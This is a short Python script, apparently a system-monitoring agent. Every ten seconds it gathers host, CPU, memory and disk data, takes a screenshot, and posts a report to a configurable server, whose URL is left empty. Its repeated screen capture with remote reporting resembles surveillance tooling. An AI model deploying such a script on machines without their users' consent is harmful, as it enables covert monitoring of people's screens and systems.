import psutil, socket, requests, time, sys
from PIL import ImageGrab

SERVER_URL = ''

def coletar_dados():
    hostname = socket.gethostname()
    sistema = f"{sys.platform} {sys.version}"
    cpu_percent = psutil.cpu_percent(interval=1)
    memoria = psutil.virtual_memory()._asdict()
    disco = psutil.disk_usage('/')._asdict()

    imagem = ImageGrab.grab()
    imagem.save(f'screenshot_{hostname}.png')

    dados = {
        'hostname': hostname,
        'sistema': sistema,
        'cpu_percent': cpu_percent,
        'memoria': memoria,
        'disco': disco,
        'screenshot': f'screenshot_{hostname}.png'
    }
    response = requests.post(SERVER_URL, json=dados)
    print(response.json())

if __name__ == '__main__':
    while True:
        coletar_dados()
        time.sleep(10)